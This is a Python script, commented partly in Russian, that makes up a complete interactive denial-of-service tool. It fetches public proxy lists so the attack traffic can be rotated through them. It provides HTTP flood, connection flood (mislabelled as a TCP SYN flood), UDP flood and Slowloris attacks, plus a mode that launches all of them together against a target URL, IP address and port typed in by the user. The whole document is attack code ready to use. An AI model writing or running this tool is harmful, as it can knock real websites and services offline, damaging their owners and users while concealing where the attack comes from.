import threading
import socket
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
import socks
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DDoSAttack:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ]
        self.proxy_list = []
        self.load_proxies()
        
    def load_proxies(self):
        # Автоматическое получение прокси из публичных источников
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                proxies = response.text.strip().split('\n')
                self.proxy_list.extend([p.strip() for p in proxies if p.strip()])
                print(f"Loaded {len(proxies)} proxies from {source}")
            except:
                continue
        
        # Удаление дубликатов
        self.proxy_list = list(set(self.proxy_list))
        print(f"Total unique proxies: {len(self.proxy_list)}")
    
    def get_random_proxy(self):
        if not self.proxy_list:
            return None
        return random.choice(self.proxy_list)
    
    def http_flood(self, target_url, threads_count=1000):
        print(f"Starting HTTP flood attack on {target_url} with {threads_count} threads")
        
        def attack():
            while True:
                proxy = self.get_random_proxy()
                proxies = None
                if proxy:
                    proxies = {
                        'http': f'http://{proxy}',
                        'https': f'http://{proxy}'
                    }
                
                try:
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    
                    session = requests.Session()
                    response = session.get(
                        target_url, 
                        headers=headers, 
                        proxies=proxies,
                        timeout=5,
                        verify=False
                    )
                    print(f"Request sent via proxy: {proxy} - Status: {response.status_code}")
                    
                except Exception as e:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            for _ in range(threads_count):
                executor.submit(attack)
    
    def tcp_syn_flood(self, target_ip, target_port, threads_count=500):
        print(f"Starting TCP SYN flood on {target_ip}:{target_port}")
        
        def syn_attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target_ip, target_port))
                    s.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
                    s.close()
                    print(f"SYN packet sent to {target_ip}:{target_port}")
                except:
                    pass
        
        for _ in range(threads_count):
            threading.Thread(target=syn_attack, daemon=True).start()
    
    def udp_flood(self, target_ip, target_port, threads_count=500):
        print(f"Starting UDP flood on {target_ip}:{target_port}")
        
        def udp_attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = random._urandom(1024)  # 1KB случайных данных
                    s.sendto(data, (target_ip, target_port))
                    s.close()
                    print(f"UDP packet sent to {target_ip}:{target_port}")
                except:
                    pass
        
        for _ in range(threads_count):
            threading.Thread(target=udp_attack, daemon=True).start()
    
    def slowloris_attack(self, target_ip, target_port, sockets_count=1000):
        print(f"Starting Slowloris attack on {target_ip}:{target_port}")
        
        def slowloris():
            sockets_list = []
            
            # Создание множества частичных соединений
            for i in range(sockets_count):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    
                    # Отправка неполного HTTP запроса
                    s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                    sockets_list.append(s)
                    print(f"Slowloris socket {i} connected")
                except:
                    pass
            
            # Поддержание соединений
            while True:
                for s in sockets_list:
                    try:
                        s.send(b"X-a: b\r\n")
                        time.sleep(10)
                    except:
                        sockets_list.remove(s)
                        try:
                            s.close()
                        except:
                            pass
        
        threading.Thread(target=slowloris, daemon=True).start()
    
    def start_comprehensive_attack(self, target_url, target_ip, target_port=80):
        print("Starting comprehensive DDoS attack...")
        
        # Запуск всех типов атак одновременно
        attacks = [
            lambda: self.http_flood(target_url, 500),
            lambda: self.tcp_syn_flood(target_ip, target_port, 300),
            lambda: self.udp_flood(target_ip, target_port, 300),
            lambda: self.slowloris_attack(target_ip, target_port, 200)
        ]
        
        for attack in attacks:
            threading.Thread(target=attack, daemon=True).start()
        
        print("All attacks launched. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Attack stopped.")

if __name__ == "__main__":
    attacker = DDoSAttack()
    
    target_url = input("Enter target URL (e.g., http://example.com): ")
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port (default 80): ") or "80")
    
    print("Select attack type:")
    print("1. HTTP Flood")
    print("2. TCP SYN Flood") 
    print("3. UDP Flood")
    print("4. Slowloris")
    print("5. Comprehensive Attack (All methods)")
    
    choice = input("Enter choice (1-5): ")
    
    if choice == "1":
        attacker.http_flood(target_url)
    elif choice == "2":
        attacker.tcp_syn_flood(target_ip, target_port)
    elif choice == "3":
        attacker.udp_flood(target_ip, target_port)
    elif choice == "4":
        attacker.slowloris_attack(target_ip, target_port)
    elif choice == "5":
        attacker.start_comprehensive_attack(target_url, target_ip, target_port)
    else:
        print("Invalid choice")
